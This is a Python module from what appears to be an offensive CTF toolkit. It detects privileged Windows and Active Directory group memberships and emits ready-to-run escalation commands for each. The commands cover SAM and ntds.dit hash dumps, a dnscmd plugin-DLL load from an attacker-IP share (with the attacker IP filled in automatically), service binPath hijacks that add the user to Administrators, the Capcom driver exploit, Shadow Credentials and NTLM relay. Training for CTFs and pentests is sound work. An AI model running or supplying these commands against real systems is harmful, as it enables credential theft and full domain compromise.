"""
CTFKit - Windows PrivEsc
Privileged Groups Analyzer
"""

import re

from rich.console import Group
from rich.table import Table
from rich.text import Text

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost


SECTION = "GROUPS"


# ==========================================
# KNOWLEDGE BASE
# ==========================================

#
# Built-in AD-only groups — their mere presence in `net localgroup`
# means this box is a Domain Controller (they never exist on a
# member server or workstation).
#
DC_MARKERS = (
    "Enterprise Admins",
    "Domain Admins",
    "Cert Publishers",
    "Allowed RODC Password Replication Group",
    "Denied RODC Password Replication Group",
)

GROUPS = {

    "BUILTIN\\Backup Operators": {

        "priority": "HIGH",

        "reason": (
            "Grants SeBackupPrivilege/SeRestorePrivilege — bypasses file and registry "
            "read/write ACLs entirely. If whoami /priv shows them Disabled, membership "
            "alone is enough to enable them (e.g. via SeBackupPrivilegeUtils/CmdLets or "
            "an elevated prompt)."
        ),

        "recommendation": [
            "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive, extract offline with secretsdump.py",
            "Or copy any ACL-protected file directly via a SeBackupPrivilege-aware copy (e.g. Copy-FileSeBackupPrivilege)",
            "Run: ctf privesc.windows.groups.backup sam",
        ],

        #
        # Optional: overrides "recommendation" when the box is detected as a Domain Controller.
        #
        "recommendation_dc": [
            "diskshadow.exe to shadow-copy C: and expose it (ntds.dit is locked on the live volume)",
            "robocopy /b <shadow>:\\Windows\\NTDS\\ntds.dit + reg save HKLM\\SYSTEM, then secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL for a full domain hash dump",
            "Run: ctf privesc.windows.groups.backup ntds",
        ],

        "dc_note": " This host is a Domain Controller, so NTDS.dit (full domain hash dump) is the real target.",

    },

    "BUILTIN\\Event Log Readers": {

        "priority": "HIGH",

        "reason": (
            "Grants read access to the Security event log via wevtutil/Get-WinEvent. If process-creation "
            "auditing with command-line logging is enabled (Event ID 4688), credentials passed as plaintext "
            "command-line arguments (e.g. \"net use ... /user:x password\") end up sitting in the log."
        ),

        "recommendation": [
            'wevtutil qe Security /rd:true /f:text | findstr /i "/user password /p: pass="',
            "Get-WinEvent needs more than this group alone (admin, or adjusted perms on "
            "HKLM\\System\\CurrentControlSet\\Services\\Eventlog\\Security) — wevtutil works with just Event Log Readers",
            "Also check the PowerShell Operational log (Microsoft-Windows-PowerShell/Operational) for script "
            "block/module logging content — readable without any special privilege",
            "Run: ctf privesc.windows.groups.eventlogs",
        ],

    },

    #
    # DnsAdmins is a domain group, not a local BUILTIN one — no fake "BUILTIN\" prefix here,
    # _short_name() matches on the trailing group name regardless of the domain prefix used.
    #
    "DnsAdmins": {

        "priority": "HIGH",

        "reason": (
            "Members can reconfigure the DNS Server service (dns.exe, runs as SYSTEM on the DC) to load "
            "an arbitrary plugin DLL via dnscmd — code execution as SYSTEM once the service reloads the plugin."
        ),

        "recommendation": [
            "dnscmd.exe <DC-HOSTNAME> /config /serverlevelplugindll \\\\<ATTACKER-IP>\\share\\evil.dll",
            "The DLL only loads once the DNS service restarts — DnsAdmins doesn't grant that by default, so "
            "you'll need separate rights to restart it, a scheduled restart, or to crash it into an auto-restart",
            "No local DC access needed — this can be run remotely from any domain-joined host using valid "
            "DnsAdmins credentials",
            "Run: ctf privesc.windows.groups.dnsadmins",
        ],

    },

    "BUILTIN\\Hyper-V Administrators": {

        "priority": "HIGH",

        "reason": (
            "Full control over every VM on this hypervisor. If a Domain Controller is virtualized here, "
            "cloning/mounting its virtual disk offline yields ntds.dit directly — treat this group as "
            "Domain Admin-equivalent in that case."
        ),

        "recommendation": [
            "Check for a virtualized DC: export/clone its VM, mount the .vhdx offline, pull ntds.dit + the SYSTEM hive",
            "No virtualized DC? Delete a .vhdx and hard-link it to a SYSTEM-owned target file (e.g. an "
            "unprivileged-startable service binary like Mozilla Maintenance Service) — vmms.exe restores "
            "file permissions as SYSTEM without impersonation on VM delete, handing you full control of the target",
            "takeown /F <target>, replace it with a malicious binary, then start the service for SYSTEM code exec",
            "Also check CVE-2018-0952 / CVE-2019-0841 directly if the box predates the March 2020 patches — "
            "same hard-link class of bug, patched since",
        ],

    },

    "BUILTIN\\Print Operators": {

        "priority": "HIGH",

        "reason": (
            "Grants SeLoadDriverPrivilege plus rights to log on locally to and shut down a DC. Classic path "
            "is loading the vulnerable Capcom.sys driver for a SYSTEM token-steal exploit — but this was "
            "killed by Windows 10 1803+ (HKEY_CURRENT_USER driver registry refs no longer work), so check "
            "the build first. whoami /priv may not show the privilege at all until a UAC bypass is done."
        ),

        "recommendation": [
            "Only works pre-Windows 10 1803 / Server 2016 — HKCU driver registry refs are blocked after that",
            'reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d "\\??\\C:\\path\\Capcom.sys"',
            "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1",
            "Enable SeLoadDriverPrivilege and load the driver (EnableSeLoadDriverPrivilege.exe, or "
            "EoPLoadDriver.exe to automate privilege+registry+load in one step), then run ExploitCapcom.exe "
            "to steal a SYSTEM token",
            "No GUI? Patch ExploitCapcom.cpp's LaunchShell() to spawn a custom binary/reverse shell instead of cmd.exe",
            "Run: ctf privesc.windows.groups.printop",
        ],

    },

    "BUILTIN\\Server Operators": {

        "priority": "HIGH",

        "reason": (
            "SERVICE_ALL_ACCESS over most local services by default, plus SeBackupPrivilege/SeRestorePrivilege "
            "and the right to log on locally to servers — including Domain Controllers. Reconfiguring any "
            "SYSTEM-run service's binary path is arbitrary SYSTEM-context code execution."
        ),

        "recommendation": [
            "sc qc <service> to confirm it runs as LocalSystem, then sc sdshow <service> (or PsService.exe "
            "security <service>) to confirm Server Operators has SERVICE_ALL_ACCESS",
            "AppReadiness is a reliable target — demand-start, safe to leave stopped afterward",
            'sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"',
            "sc start AppReadiness   # expected to fail — the payload still runs before service registration fails",
            "net localgroup Administrators   # confirm the account landed",
            "Run: ctf privesc.windows.groups.serverops",
        ],

    },

    #
    # Account Operators is also a domain group, not a local BUILTIN one.
    #
    "Account Operators": {

        "priority": "HIGH",

        "reason": (
            "Can create, modify, and delete most non-protected user/group/computer objects in AD, reset "
            "their passwords, and by default can log on locally to a Domain Controller."
        ),

        "recommendation": [
            "Reset the password of a more-privileged non-protected account you can then authenticate as",
            "Or add yourself to a group that isn't itself AdminSDHolder-protected — built-in protected "
            "groups (Domain Admins, Enterprise Admins, etc.) can't be touched directly this way",
            "Get-ADUser/Get-ADGroup -Filter * (or dsa.msc) to find accounts you can actually manage — "
            "AdminCount 0 or blank, and not a member of a protected group",
        ],

    },

    "Group Policy Creator Owners": {

        "priority": "HIGH",

        "reason": (
            "Can create new GPOs. Membership alone doesn't grant link rights, but that's a common separate "
            "misconfig — if you also have link rights on an OU, you can push a malicious GPO that runs as "
            "SYSTEM on every computer in that OU."
        ),

        "recommendation": [
            "Check for link rights: Get-DomainOU | Get-ObjectAcl (PowerView) or Get-GPPermission, look "
            "for GPLink rights on any OU held by you or a group you're in",
            "No link rights anywhere? This one's a dead end on its own — membership alone isn't enough",
            "If you have link rights: SharpGPOAbuse.exe --AddComputerTask --TaskName <name> "
            "--Command <payload> --GPOName <existing GPO you can edit>",
            "Wait for the ~90 min refresh cycle, or force it: gpupdate /force on a target computer "
            "(or Invoke-GPUpdate remotely if you have rights to trigger it)",
        ],

    },

    "Key Admins": {

        "priority": "HIGH",

        "reason": (
            "Write access to msDS-KeyCredentialLink on user/computer objects — the Shadow Credentials "
            "attack. Attach an alternate certificate-based credential to any target object and authenticate "
            "as them via PKINIT, no password reset needed. Works against computer accounts too."
        ),

        "recommendation": [
            "Whisker.exe add /target:<user_or_computer>   (pyWhisker if working from Linux)",
            "Rubeus.exe asktgt /user:<target> /certificate:<base64 from Whisker> /password:<cert password> /nowrap",
            "Against a computer account, chain into Resource-Based Constrained Delegation for further escalation",
            "Cleanup: Whisker.exe remove /target:<target> /deviceid:<id from add step> — revert the added key",
        ],

    },

    "Enterprise Key Admins": {

        "priority": "HIGH",

        "reason": (
            "Same as Key Admins (msDS-KeyCredentialLink write access, Shadow Credentials attack) but "
            "forest-wide rather than scoped to one domain."
        ),

        "recommendation": [
            "Whisker.exe add /target:<user_or_computer>   (pyWhisker if working from Linux)",
            "Rubeus.exe asktgt /user:<target> /certificate:<base64 from Whisker> /password:<cert password> /nowrap",
            "Against a computer account, chain into Resource-Based Constrained Delegation for further escalation",
            "Cleanup: Whisker.exe remove /target:<target> /deviceid:<id from add step> — revert the added key",
        ],

    },

    "Exchange Windows Permissions": {

        "priority": "MEDIUM",

        "reason": (
            "Membership itself confirms Exchange is deployed in this domain. Historically had WriteDACL on "
            "the domain object by default — the PrivExchange chain escalates a compromised Exchange-related "
            "account straight to DCSync rights. Depends on the org never having applied Microsoft's mitigations."
        ),

        "recommendation": [
            "Get-ObjectAcl -DistinguishedName 'DC=<domain>,DC=<tld>' -ResolveGUIDs (PowerView) — check for "
            "WriteDacl held by Exchange-related principals before assuming this works",
            "If present and unpatched: coerce the Exchange server's machine account to authenticate "
            "(PushSubscription/EWS) and relay it to LDAP to grant your account DCSync rights (ntlmrelayx)",
            "Verify Exchange patch level first — Microsoft's Feb 2019+ updates largely close this off",
        ],

    },

}


# ==========================================
# HELPERS
# ==========================================

def _get_command_output(section, command):
    pattern = rf">>> COMMAND: {re.escape(command)}\n\n(.*?)(?=\n>>> COMMAND:|\Z)"
    match = re.search(pattern, section, re.S)
    return match.group(1).strip() if match else ""


def _short_name(name):
    return name.rsplit("\\", 1)[-1].strip().lower()


def _is_domain_controller(section):
    return any(marker in section for marker in DC_MARKERS)


# ==========================================
# PARSER
# ==========================================

def _parse(section):

    #
    # whoami /groups /fo list -> "Group Name: BUILTIN\Backup Operators"
    #
    groups_text = _get_command_output(section, "whoami /groups /fo list")

    token_groups = re.findall(r"^Group Name:\s*(.+?)\s*$", groups_text, re.M)

    #
    # net user <username> -> "Local Group Memberships      *Backup Operators ..."
    # Cross-check against a stale token (added to a group mid-session).
    #
    account_groups = []

    match = re.search(r"Local Group Memberships\s+(.*)", section)

    if match:
        account_groups = [g.strip() for g in match.group(1).split("*") if g.strip()]

    return token_groups, account_groups


# ==========================================
# REPORT
# ==========================================

PRIORITY_MARKUP = {
    "HIGH": "bold red",
    "MEDIUM": "bold yellow",
    "LOW": "bold cyan",
}


def _render_report(token_groups, account_groups, detected, is_dc):

    elements = []

    dc_style = "bold red" if is_dc else "dim"
    elements.append(
        Text.from_markup(f"[{dc_style}]Domain Controller: {'Yes' if is_dc else 'No'}[/{dc_style}]")
    )

    if detected:

        table = Table(
            box=None,
            show_header=True,
            header_style="bold cyan",
            pad_edge=False,
            padding=(0, 2, 0, 0),
        )

        table.add_column("Group")
        table.add_column("Priority")

        for name in detected:

            priority = GROUPS[name]["priority"]
            style = PRIORITY_MARKUP[priority]

            table.add_row(
                f"[bold white]{name}[/bold white]",
                f"[{style}]{priority}[/{style}]",
            )

        elements.append(Text(""))
        elements.append(table)

    if account_groups:

        elements.append(Text(""))
        elements.append(
            Text.from_markup(
                f"[bold cyan]net user memberships:[/bold cyan] {', '.join(account_groups)}"
            )
        )

    return Group(*elements)


def _dnsadmins_recommendation(base):

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    hostname = data.get("hostname") or "<DC-HOSTNAME>"
    attacker_ip = resolve_lhost(data=data) or "<ATTACKER-IP>"

    recommendation = list(base)
    recommendation[0] = f"dnscmd.exe {hostname} /config /serverlevelplugindll \\\\{attacker_ip}\\share\\evil.dll"

    return recommendation


def _serverops_recommendation(base):

    try:
        data, _ = load_current_profile()
        user = get_active_cred(data).get("user")
    except Exception:
        user = None

    if not user:
        return list(base)

    return [line.replace("<USER>", user) for line in base]


# ==========================================
# PUBLIC API
# ==========================================

def analyze(section):

    token_groups, account_groups = _parse(section)

    my_short_names = {
        _short_name(g)
        for g in token_groups + account_groups
    }

    is_dc = _is_domain_controller(section)

    findings = []
    detected = []

    for name, info in GROUPS.items():

        if _short_name(name) not in my_short_names:
            continue

        detected.append(name)

        reason = info["reason"]

        if name == "DnsAdmins":
            recommendation = _dnsadmins_recommendation(info["recommendation"])
        elif name == "BUILTIN\\Server Operators":
            recommendation = _serverops_recommendation(info["recommendation"])
        elif is_dc and "recommendation_dc" in info:
            recommendation = info["recommendation_dc"]
            reason += info.get("dc_note", "")
        else:
            recommendation = info["recommendation"]

        findings.append({

            "priority": info["priority"],
            "module": "GROUPS",
            "title": name,
            "reason": reason,
            "recommendation": recommendation,

        })

    return {

        "module": "GROUPS",

        "summary": {

            "Token Groups": len(token_groups),
            "Privileged": len(detected),
            "Domain Controller": "Yes" if is_dc else "No",

        },

        "findings": findings,

        "report": _render_report(token_groups, account_groups, detected, is_dc),

        "details": {

            "token_groups": token_groups,
            "account_groups": account_groups,
            "privileged": detected,
            "is_dc": is_dc,

        }

    }
